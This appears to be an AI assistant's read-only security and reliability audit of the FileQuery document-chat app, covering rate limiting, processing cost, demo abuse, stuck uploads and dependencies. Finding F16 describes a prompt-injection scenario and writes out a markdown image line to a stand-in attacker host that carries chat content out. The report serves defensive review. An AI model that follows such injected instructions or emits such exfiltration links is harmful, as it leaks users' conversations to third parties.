# FileQuery audit: findings and remediation plan

Audit date 2026-10-22, branch `main`, working tree clean. Nothing in the repo was modified. The only file I created was a throwaway reproduction script in the session scratchpad.

**Labels used:** **Confirmed** means shown by code reading or by a reproduction I ran. **Potential** means it depends on deployment or infra I could not see, on scale, or on browser behaviour. **Recommendation** means hardening, not a defect.

---

## 1. Executive summary

FileQuery is a Next.js 16 frontend and a FastAPI backend with Postgres/pgvector. Uploads go to S3 and are processed by an SQS/Lambda worker that calls Bedrock. The codebase is small (about 5k lines) and the fundamentals are sound. Every route checks ownership, queries are parameterized, S3 uploads use pinned presigned POSTs, and the JWT lives in an httpOnly cookie. No secrets are in git history. The problems are in abuse and cost controls, failure handling in the processing pipeline, a few user-visible bugs, and the lack of any tests or CI gates.

**The five things that matter most**

1. **Rate limiting does nothing** (Confirmed, reproduced). `@limiter.limit` sits above `@router.post` on every route, so the limiter wraps a function FastAPI never registered. My reproduction gave `200,200,200,200,200` with the repo's order and `200,200,429,429,429` with the correct order. Registration is open and unverified, so anyone can mint accounts. Fixing the order alone is not enough, because the backend only ever sees the Next.js server's IP. A naive fix would give all users one shared bucket.
2. **Document processing has no ceiling and fails silently.** It makes two Bedrock calls per chunk, sequentially, with no cap on file size or chunk count. A parse failure never marks the file as errored, so it stays on "processing" forever and the UI polls it every 3 seconds indefinitely.
3. **The public demo can be wiped by any anonymous visitor.** `POST /api/auth/demo` is unthrottled, and nothing stops the demo user calling `DELETE /api/projects/{id}`. The demo is your recruiter-facing entry point. The demo token also lasts 7 days, where the spec says 2 hours.
4. **A confirmed UI bug clears the whole chat history** on any failed send (`ChatTab.tsx:175-179`).
5. **The dashboard does heavy N+1 loading on every render and every poll.** The project list endpoints return every message, citation and chunk for every project, and the dashboard calls them on each render.

Also worth acting on soon: `npm audit` reports 11 vulnerabilities (1 critical, 9 high), including `next`, though the critical `next/og` issue looks unexploitable because the app does not use that feature. There are no tests, and CI never builds or tests anything.

**Counts:** 20 findings: 0 Critical, 6 High (F1–F6), 11 Medium (F7–F17), 3 Low (F18–F20, each grouping several small items). The dependency scanner rates `next` as Critical, but I rate the practical risk lower (see F12).

## 2. Findings

Effort: S is under half a day, M is 1–2 days, L is more than 2 days.

### High

**F1. Rate limiting is inert, and would use the wrong key if fixed** (Security/Cost · High · Confirmed)
- Evidence: `backend/src/features/auth/user_routes.py:14-15, 30-31, 51-52, 85-86`, `file_routes.py:45-46`, `chat_routes.py:37-38`. `/api/auth/demo` has no limiter at all. `docs/specs/public-demo-mode.md` also suspected this. Key function: `backend/src/limiter.py:5` (`get_remote_address`).
- Problem: the decorator order is reversed. Separately, the browser never calls the backend, so `get_remote_address` would return the Next.js server's IP for every user.
- Impact: unlimited brute-force on login, unlimited account creation, and unlimited upload and processing requests. Each account also gets 40 chat messages and 3 projects, so account farming drives Bedrock spend.
- Fix:
  - Put `@limiter.limit` below `@router.*`, and add `request: Request` where it is missing.
  - Choose a key. For authenticated routes use the user id. For login, register and demo, have the Next server action forward the client IP (`x-forwarded-for`) and have the backend trust it only from that source.
  - Add a `/api/auth/demo` limit and a daily registration cap.
  - Add a test that proves a 429 is returned.
- Effort: S for the ordering, M for correct keying.

**F2. Document processing has no size or chunk ceiling, and it is sequential and expensive** (Reliability/Cost · High · Confirmed in code; infra settings unverified)
- Evidence: `file_processing_service.py:219-231` (`create_chunks` makes one `get_response` title call and one `generate_embedding` call per chunk, serially, each building a new boto3 client via `embedding_service.py:32-33`). `file_schema.py:27` allows 500 MB files, and `settings.py:24` allows 2 GB per user. There is no limit on chunk count, extracted-text length, PDF page count, or files per request (`file_routes.py:49`).
- Problem: a single large text file can produce tens of thousands of chunks and twice as many Bedrock calls. Nothing is saved until the final commit (`process_embeddings`, lines 253-259). If Lambda times out or Bedrock throttles, the whole job restarts via SQS redelivery and the spend is repeated.
- Impact: runaway Bedrock and Lambda cost, and files that never finish. A single abusive account is enough.
- Fix:
  - Immediately: cap extracted characters, chunks and PDF pages, and cap files per request. Reject over-limit files with a clear error.
  - Next: drop or defer per-chunk titles, since they feed only the citation label and the project name. Reuse one boto3 client, batch or parallelize embeddings with backoff, and checkpoint progress.
  - Infra (not visible to me): set a DLQ and `maxReceiveCount`, Lambda reserved concurrency, and an AWS Budget alarm.
- Effort: S for the caps, M for the redesign.

**F3. The shared demo can be wiped or abused by any anonymous visitor** (Security/Availability · High · Confirmed)
- Evidence: `project_routes.py:65-74` and `file_routes.py:113-122` (no `is_demo` guard; `grep is_demo` shows guards only on upload limits and the chat cap). `user_routes.py:73-82` (`/demo` is unauthenticated and unthrottled). `user_service.py:113-117` gives the demo token `ACCESS_TOKEN_EXPIRE_MINUTES` (7 days); the spec says 2 h.
- Problem: any visitor can delete the seeded project and files, or fill the 3-project and 2 GB quota with junk. The demo's quota and chat cap are shared, so one visitor can exhaust them for everyone. The banner admits users can change content, but deleting the seeded data is destructive and needs a manual reseed.
- Impact: the demo link on your portfolio can break for recruiters with no warning.
- Fix:
  - Return 403 for demo users on delete (project and file) and rename.
  - Shorten the demo token to the spec's 2 h.
  - Throttle `/demo`.
  - Add stricter demo upload limits (size and count).
  - Optionally add a read-only mode.
  - Consider a scheduled reseed.
- Effort: S.

**F4. Files get stuck in "processing" forever when extraction or enqueue fails** (Bug/Reliability · High · Confirmed)
- Evidence:
  - `file_processing_service.py:90-105`: when download, extract or chunk fails, only an analytics event is sent and the file's status is not changed. The error path in `process_embeddings` (lines 271-286) is never reached.
  - `file_extraction_service.py:12-17`: `.decode("utf-8")` raises on any non-UTF-8 text or CSV, such as Windows-1252 exports.
  - `file_routes.py:103-109` and `file_processing_service.py:50-65`: status is committed as `processing` before `enqueue_files` runs. An SQS failure leaves every file stuck.
  - `useGetFiles.ts:55-57`: polling continues every 3 s while any file is pending or processing, so it never stops.
- Impact: common files (a Windows CSV, a corrupt PDF) show a spinner forever. Stuck files also count against the 2 GB quota, and the chat stays disabled while all files are processing.
- Fix:
  - Wrap the whole `process_file` in a handler that sets `status=error` and a user-safe message.
  - Decode with a fallback (utf-8-sig, then cp1252, then `errors="replace"`).
  - Enqueue before the commit, or add a reconciler for files stuck in `processing` longer than N minutes.
  - Add a poll ceiling in the hook.
- Effort: S–M.

**F5. A failed chat send wipes the entire conversation from the screen** (Bug · High · Confirmed)
- Evidence: `frontend/features/files/components/ChatTab.tsx:175-179`. The filter result is discarded, then `return []`.
- Impact: any error clears the visible history until reload, including the monthly-limit 429, which is easy to hit. It looks like data loss.
- Fix: `setMessages(prev => prev.filter(m => m.id !== optimistic.id))`.
- Effort: S (one line).

**F6. N+1 and over-fetching on the project endpoints, hit on every dashboard render** (Performance · High · Confirmed)
- Evidence:
  - `project_routes.py:15-33` returns `ProjectResponse` (`project_schema.py:14-17`), which includes all `files` and all `messages`.
  - `chat_schema.py:19-35` serialises `data.chunks`, and `file_schema.py:71-78` reads `data.file.name`. Neither relationship is eager-loaded in `get_projects`, and `get_project` loads only messages and files.
  - `frontend/app/dashboard/page.tsx:21-31` calls both endpoints on every render. `useGetFiles` polling calls `revalidatePath("/dashboard")` (`features/files/server-actions.ts:19`) every 3 s, which re-renders the route and repeats the calls.
- Impact: each dashboard load issues roughly 1 + messages + chunks queries and returns unbounded payloads. It gets slower as conversations grow.
- Fix:
  - Make the list endpoint slim (id, name, counts).
  - Make the detail endpoint metadata-only. The dashboard uses it only as a 404/403 check.
  - Messages are already paginated via `/messages`.
  - Drop `revalidatePath` from the polled `getFiles`.
- Effort: M.

### Medium

**F7. No indexes on foreign keys or on the vector column** (Performance · Medium · Confirmed absent; impact grows with scale)
- Evidence: `backend/alembic/versions/*` and the models. The only indexes are the primary keys, the `users.email` unique index, the demo partial index, and the GIN full-text index. Nothing is on `files.project_id`, `chunks.file_id`, `messages.project_id` or `projects.user_id`, and there is no ANN index on `chunks.embedding`.
- Impact: retrieval joins `chunks` to `files` filtered by project and likely scans the largest table (wide 1024-float rows) on every question.
- Fix: one migration adding btree indexes on those four columns, built with `CREATE INDEX CONCURRENTLY`. Add an HNSW index later only if chunk counts justify it. The similarity-threshold `WHERE` clause would need rewriting to use it.
- Effort: S.

**F8. `.doc` files cannot be extracted in the Lambda image** (Bug · Medium · Confirmed from the Dockerfile; deployed behaviour unverified)
- Evidence: `file_extraction_service.py:80-88` shells out to `antiword`. `embedding_worker.Dockerfile` never installs it.
- Impact: every `.doc` upload fails in production (and, per F4, hangs). Local dev works only if antiword is installed on the machine.
- Fix: install antiword in the image, or drop `.doc` from the supported types. Also stop advertising `.doc` in the upload hint until fixed.
- Effort: S.

**F9. Upload and quota edge cases leave orphaned or stuck files** (Bug/Data integrity · Medium · Confirmed)
- Evidence:
  - `file_service.py:186-190`: when the quota check fails, `break` exits the loop and the remaining files are left `pending`, their S3 objects uploaded.
  - `file_schema.py:24-29`: `size` has no lower bound, so a negative size offsets the batch total in `create_files` (lines 114-129). The real quota is re-checked at confirm, so this is a validation gap, not a quota bypass.
  - `file_service.py:210`: deleting a `pending` file does not delete its S3 object, and abandoned pending uploads are never cleaned up.
  - `file_service.py:14` duplicates the quota constant instead of using `settings.MAX_USER_STORAGE`.
  - `file_service.py:83-91` loads full `File` rows just to sum sizes.
- Fix: mark the rest of the batch `error` instead of `break`; add `Field(gt=0)` on size; use `func.sum` for storage; add an S3 lifecycle rule or sweeper for abandoned objects; use the settings constant.
- Effort: M.

**F10. Every later upload overwrites a user-renamed project name** (Bug · Medium · Confirmed)
- Evidence: `file_routes.py:104-110` calls `enqueue_files(files)` with the default `rename_project=True`, regardless of whether the project is new. `file_processing_service.py:111-113` and `303-351` then rename it. In production the "last" file may finish before the others, so the name reflects partial content. `name_project` also eager-loads every chunk including embeddings (lines 306-310).
- Fix: rename only when the project was just created by this upload and still has the default name. Query only the first few chunk titles.
- Effort: S.

**F11. Chat message handling: no length limit, wasteful ordering, off-by-one cap** (Bug/Cost · Medium · Confirmed)
- Evidence: `chat_schema.py:38-39` has no `max_length`. `chat_service.py:109` saves the user message before the Bedrock calls, so a failure leaves an orphan that still counts against quota. `chat_routes.py:52` uses `>` where `>=` is meant, allowing 41 messages. The cap check is not atomic.
- Impact: an oversized message makes the embedding call fail with a 500 and burns tokens. History fills with unanswered messages.
- Fix: `Field(max_length=2000)`; persist the user and assistant messages together in one transaction; use `>=`. Also fix `get_messages` (`chat_service.py:44, 65`), where `?limit=-1` produces an empty list and then `messages[-1]` raises `IndexError`.
- Effort: S.

**F12. Dependency advisories** (Security · Medium · Confirmed by `npm audit`; applicability varies)
- Evidence: `npm audit --omit=dev`: 11 findings, 1 critical, 9 high, 1 moderate. The critical items are in `next` (RCE in `next/og` and a `use cache` draft-mode leak). I grepped and the app uses neither `next/og` nor `use cache`, so exposure looks low. The fix is `next@16.4.2`, which is outside the pinned `16.3.5`. The rest are in `shadcn` (CLI), `sharp`, `source-map-js`, `braces` and `hono` (transitive).
- Also: `shadcn` is a runtime dependency but is a CLI. `cn@0.3.0` is imported by every UI component in place of the usual `clsx` + `tailwind-merge`, and it is an unusual single-purpose dependency. `Dockerfile` uses `npm install` rather than `npm ci`.
- Python: not scanned (see section 5). `requirements.txt` is a full `pip freeze`. `openai`, `onnxruntime`, `networkx` and `sentry-sdk` have no imports in `backend/src`, so they look unused. That bloats the Lambda image.
- Fix: bump Next and eslint-config-next, run `npm audit fix`, move `shadcn` to devDependencies, switch to `npm ci`, trim `requirements.txt`, and run `pip-audit` in CI.
- Effort: S.

**F13. Database and AWS client configuration is all defaults** (Reliability/Performance · Medium · Potential)
- Evidence: `database.py:21` is `create_engine(DATABASE_URL)` with no `pool_pre_ping`, `pool_recycle`, or pool sizing. `embedding_service.py` and `file_service.py` build a new boto3 client per call and set no timeouts or retry config. `embedding_service.py:20-24, 144-147` hardcodes `eu-central-1` for rerank while everything else uses `settings.AWS_REGION`.
- Problem: a chat request holds a pooled DB connection across four sequential Bedrock calls (rewrite, embed, rerank, generate), so roughly 15 concurrent chats exhaust the default pool. Idle connections dropped by Cloud Run or Postgres cause stale-connection errors. Many concurrent Lambdas can exceed Postgres `max_connections`.
- Fix: `pool_pre_ping=True`, `pool_recycle`, sized pools; release the DB session between Bedrock calls; botocore `Config` with timeouts and adaptive retries; shared module-level clients; use `NullPool` or a pooler for Lambda; region from settings.
- Effort: S–M.

**F14. Upload validation trusts the browser's MIME type** (Bug/UX · Medium · Potential, browser-dependent)
- Evidence: `features/files/server-actions.ts:27` sends `file.type`, and the backend only accepts exact matches (`file_schema.py:31-38`).
- Impact: browsers and Windows often report `.md` as an empty type and `.csv` as `application/vnd.ms-excel`, so valid files are rejected with a confusing message. The extension-to-label map in `file_schema.py:9-16` is also swapped (`.doc` and `.docx`).
- Fix: derive the MIME type from the extension on the client and re-validate it on the server. Fix the swapped labels.
- Effort: S.

**F15. Upload and polling UX gaps** (Bug · Medium · Confirmed)
- Evidence: `FilesTabs.tsx:130-161`: when `confirmUploads` fails (for example a quota error), the list is cleared with no toast. `useGetFiles.ts:49`: a single failed poll (`result === null`) ends polling permanently.
- Fix: show a toast on confirm failure and keep the failed files in the list. Retry the poll with backoff and stop it after a ceiling.
- Effort: S.

### Medium/Low, potential

**F16. Markdown images in assistant output can exfiltrate data via prompt injection** (Security · Medium · Potential)
- Evidence: `MessageCard.tsx:23` renders `<ReactMarkdown>` with defaults. Raw HTML is not rendered, but remote images are. Document text is placed straight into the prompt (`chat_service.py:287-315`).
- Scenario: a user uploads a document containing hidden instructions. The model emits `![](https://attacker/?q=<chat content>)`, and the browser fetches it. The attacker needs the victim to upload the file, so this is Potential.
- Fix: override `img` in react-markdown (disallow, or proxy and allowlist) and set a CSP with restricted `img-src`.
- Effort: S.

**F17. No tests, no quality gates, thin observability** (Testing/CI · Medium · Confirmed)
- Evidence: there are no tests. `backend/test_bedrock.py` is a manual REPL. `.github/workflows/build-and-push.yml` builds and pushes the worker image on every backend push with no lint, test or scan. It pushes to ECR but does not deploy. `.github/workflows/test-aws.yml` is a leftover that runs `aws sts get-caller-identity` on every push to `main`. There is no frontend CI. `sentry-sdk` is in requirements but never imported, so there is no error tracking.
- Impact: F1, F4, F5 and F10 are the kind of defect one small test each would catch.
- Fix: add a CI workflow (pytest, `tsc`, eslint, `npm audit`, `pip-audit`) and write the first tests for auth and ownership, quota and upload confirmation, extraction and chunking, and the rate limiter. Delete `test-aws.yml`. Either wire up Sentry or remove it.
- Effort: M for the first gates, L for broad coverage.

### Low

**F18. Hardening and config hygiene** (Recommendation · Low)
- `main.py:63`: CORS always allows `http://localhost:3000` with credentials, and `settings.py:17` defaults `FRONTEND_URL` to localhost. The browser never calls the backend, so CORS can be restricted to the real frontend origin.
- `/docs` and `/openapi.json` are exposed in production (`main.py:21`).
- `frontend/next.config.ts` sets no security headers (CSP, `X-Frame-Options`, and so on).
- Both Dockerfiles run as root.
- `frontend/public/` is empty, so the `og-image.jpg` referenced in `app/layout.tsx:60` returns 404. The frontend Dockerfile also never copies `public/`.
- `frontend/lib/analytics/client.ts:15-16` logs to the console on every init, and line 6 has a hardcoded fallback key (a public PostHog project key, which is fine by design, but better to remove the fallback).

**F19. Auth hardening** (Recommendation · Low)
- Emails are matched case-sensitively, so `A@x.com` and `a@x.com` can be two accounts (`user_service.get_user_by_email`).
- Register returns 409 for an existing email, and login on an unknown email skips bcrypt, so both allow account enumeration.
- Two concurrent registrations hit the unique constraint and return a generic 503.
- The password maximum of 30 is low (`user_schema.py:16-18`).
- Tokens last 7 days with no revocation.
- Routes return 403 for another user's resource instead of 404, and `storageKey` and raw `file.error` text are returned to clients.

**F20. Maintainability grab-bag** (Low)
- `reprocess_all.py` deletes every message and chunk for all users with no confirmation or environment guard. With a production `DATABASE_URL` in `.env` it is a footgun.
- Debug scripts (`add_titles.py`, `reprocess_all.py`, `test_bedrock.py`) live in the backend root.
- `chat_service.py:20-21` sets the root logger level globally.
- `HTTPException` and `AppError` are used inconsistently.
- `User.projects` is typed as a single `Project` (`user_model.py:24`).
- A demo-limit message prints bytes as "MB" (`demo_service.py:15-18`).
- `CitationDetail` and `MessageCard` use `key={citation.title}`, and titles are nullable and non-unique.
- ESLint reports 3 errors and 6 warnings (`ThemeToggle.tsx:12,16`, `use-mobile.ts:14`, and unused imports).
- There is no `CLAUDE.md` at the repo root (only `frontend/CLAUDE.md`, which imports `AGENTS.md`).
- Local `backend/.env` holds static AWS access keys. It is gitignored, but a scoped dev IAM user or SSO profile would be safer. I did not read the values.

## 3. What I verified is fine

- Ownership checks exist on every project, file and message route. No IDOR found.
- All SQL goes through the ORM. The `to_tsquery` input is built from `\w+` tokens only, so no injection.
- Presigned POSTs pin content type and exact size, and storage keys are UUID-based.
- The JWT is stored httpOnly, `secure` in production, `sameSite=lax`. Passwords use `bcrypt_sha256`. `SECRET_KEY` is 43 characters.
- `.env*` files are gitignored and absent from history. A pattern search for AWS access key prefixes found nothing.
- `react-markdown` is not given raw HTML. Server actions provide their own origin checks.
- The `proxy.ts` `callbackUrl` is set but never consumed, so there is no open redirect.

## 5. Checks I could not perform

- **Deployed infrastructure:** Cloud Run, Lambda (timeout, memory, concurrency), SQS (visibility timeout, DLQ), S3 (CORS, lifecycle, public access), IAM, Postgres and Redis settings. Findings that depend on these are marked Potential.
- **Python dependency CVEs:** `pip-audit` is not installed, and installing it would have changed the environment. Only `npm audit` was run.
- **Live behaviour:** I did not start the app, hit the database, or run Bedrock, so F6 query counts and F7 query plans are from code reading, not measurement.
- **Production build and bundle size:** `next build` writes to `.next`, so I skipped it. No bundle analysis.
- **Not read in detail:** `ProjectSidebar.tsx`, `FileCard.tsx` (beyond the view handler), `ThemeToggle.tsx`, the privacy and terms pages (including whether their claims match the code), and the shadcn UI components.
- **Secrets:** I searched git history for env-like filenames and one key prefix only. I did not run a full scanner such as gitleaks. For `.env` files I read only key names, non-secret values and the length of `SECRET_KEY`.

I ran `tsc --noEmit` (clean), eslint (3 errors, 6 warnings, listed in F20), `npm audit --omit=dev`, and a throwaway rate-limiter reproduction written to the session scratchpad.
